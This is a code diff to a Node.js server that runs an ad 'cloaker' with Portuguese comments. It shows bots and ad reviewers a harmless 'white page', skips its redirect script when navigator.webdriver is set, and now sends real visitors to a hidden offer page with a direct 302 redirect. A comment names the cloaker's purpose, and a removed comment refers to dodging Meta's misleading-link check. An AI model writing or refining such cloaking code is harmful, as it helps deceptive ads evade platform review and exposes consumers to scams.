@@ -2526,19 +2526,17 @@ const STEALTH_DEFAULT_BRIDGE_HTML = `
 function buildStealthNavScript(prefix, code) {
   const navPath = '/api/n/' + prefix + '/' + code;
   const okPath = '/api/n/' + prefix + '/' + code + '/ok';
-  // Lead vai à oferta AUTOMÁTICO (sem clique). GET do anúncio continua white 200 (sem 302).
-  // Crawler sem JS fica na white. Sem visibility:hidden = sem tela branca.
-  return `<script>(function(){try{if(navigator.webdriver)return;var q=location.search||'';var p=${JSON.stringify(navPath)};var ok=${JSON.stringify(okPath)}+q;var tries=0;var done=false;function go(u){done=true;try{if(navigator.sendBeacon)navigator.sendBeacon(ok,'{}');}catch(e){}try{location.replace(u)}catch(e2){location.href=u}}function apply(d){if(!d)return;if(d.inline&&d.html){done=true;try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next)go(d.next)}function pull(){if(done||tries>=6)return;tries++;var useGet=tries>2;var url=p+q;var opts=useGet?{method:'GET',credentials:'same-origin',headers:{'Accept':'application/json','X-Stealth-Go':'1'}}:{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json','X-Stealth-Go':'1'},body:JSON.stringify({go:1})};var t=setTimeout(function(){if(!done)pull()},1000);fetch(url,opts).then(function(r){return r.ok?r.json():null}).then(function(d){clearTimeout(t);if(done)return;if(d&&(d.next||d.inline))apply(d);else if(tries<6)pull()}).catch(function(){clearTimeout(t);if(!done&&tries<6)setTimeout(pull,200)})}if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',pull);else pull()}catch(e){}})();</script>`;
+  // Fallback legado (quase não usado no GET — lead liberado vai 302 direto).
+  return `<script>(function(){try{if(navigator.webdriver)return;var q=location.search||'';var p=${JSON.stringify(navPath)}+q;var ok=${JSON.stringify(okPath)}+q;var tries=0;function go(u){try{if(navigator.sendBeacon)navigator.sendBeacon(ok,'{}');}catch(e){}try{location.replace(u)}catch(e2){location.href=u}}function apply(d){if(!d)return;if(d.inline&&d.html){try{document.open();document.write(d.html);document.close()}catch(e){}return}if(d.next)go(d.next)}function pull(){tries++;fetch(p,{method:'POST',credentials:'same-origin',headers:{'Content-Type':'application/json','Accept':'application/json'},body:'{}'}).then(function(r){return r.ok?r.json():null}).then(apply).catch(function(){if(tries<3)setTimeout(pull,300)})}if(document.readyState==='loading')document.addEventListener('DOMContentLoaded',pull);else pull()}catch(e){}})();</script>`;
 }
 
 function composeStealthHtml(inner, navScript) {
   const script = navScript || '';
-  let html = inner || '';
-  if (/<html[\s>]/i.test(html)) {
-    if (!script) return html;
-    return /<\/body>/i.test(html) ? html.replace(/<\/body>/i, script + '</body>') : html + script;
+  if (/<html[\s>]/i.test(inner)) {
+    if (!script) return inner;
+    return /<\/body>/i.test(inner) ? inner.replace(/<\/body>/i, script + '</body>') : inner + script;
   }
-  return `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Informações</title><style>body{font-family:Georgia,serif;max-width:720px;margin:0 auto;padding:24px 16px;line-height:1.65;color:#222;background:#fff}h1{font-size:1.5rem}h2{font-size:1.15rem;margin-top:1.5em}small{color:#666}</style></head><body>${html}${script}</body></html>`;
+  return `<!DOCTYPE html><html lang="pt-BR"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Informações</title><style>body{font-family:Georgia,serif;max-width:720px;margin:0 auto;padding:24px 16px;line-height:1.65;color:#222;background:#fff}h1{font-size:1.5rem}h2{font-size:1.15rem;margin-top:1.5em}small{color:#666}</style></head><body>${inner}${script}</body></html>`;
 }
 
 async function getUserPageHtml(pageId, userId) {
@@ -2585,16 +2583,23 @@ async function resolveStealthDelivery(site, ctx) {
   if (normalizeOfferDelivery(site.offer_delivery) === 'page' && site.offer_page_id) {
     return { kind: 'offer', reason: 'allowed' };
   }
-  // Lead liberado → soft_redirect via /api/n/ (GET do anúncio NUNCA dá 302 — padrão Meta "link enganoso")
+  // Lead liberado → 302 direto na oferta (função do cloaker: conversão sem fricção)
   return { kind: 'soft_redirect', url: ctx.destWithQs, reason: 'allowed' };
 }
 
 async function sendStealthDelivery(res, site, delivery, navOpts) {
-  // soft_redirect NÃO usa 302 no link do anúncio — destino só no JSON do /api/n/
+  // Lead → 302 imediato pra oferta
+  if (delivery.kind === 'soft_redirect' || delivery.kind === 'redirect') {
+    const url = delivery.url;
+    if (url) {
+      res.setHeader('Cache-Control', 'no-store, no-cache, private');
+      res.setHeader('Pragma', 'no-cache');
+      return res.redirect(302, url);
+    }
+  }
   let inner = null;
-  if (delivery.kind === 'white' || delivery.kind === 'soft_redirect' || delivery.kind === 'redirect') {
-    inner = await getStealthBridgeInnerHtml(site);
-  } else if (delivery.kind === 'gray') {
+  if (delivery.kind === 'white') inner = await getStealthBridgeInnerHtml(site);
+  else if (delivery.kind === 'gray') {
     inner = await getUserPageHtml(site.gray_page_id, site.user_id);
     if (!inner) inner = await getStealthBridgeInnerHtml(site);
   } else if (delivery.kind === 'offer') {
@@ -2630,7 +2635,7 @@ function stealthDeliveryLabel(kind) {
     white: 'White page',
     gray: 'Gray page',
     offer: 'Página da oferta (Zero-Redirect)',
-    soft_redirect: '→ Oferta (auto)',
+    soft_redirect: '→ Oferta (302)',
     soft_redirect_ok: '→ Oferta CONFIRMADA ✓',
     redirect: '→ Oferta (legado)'
   };
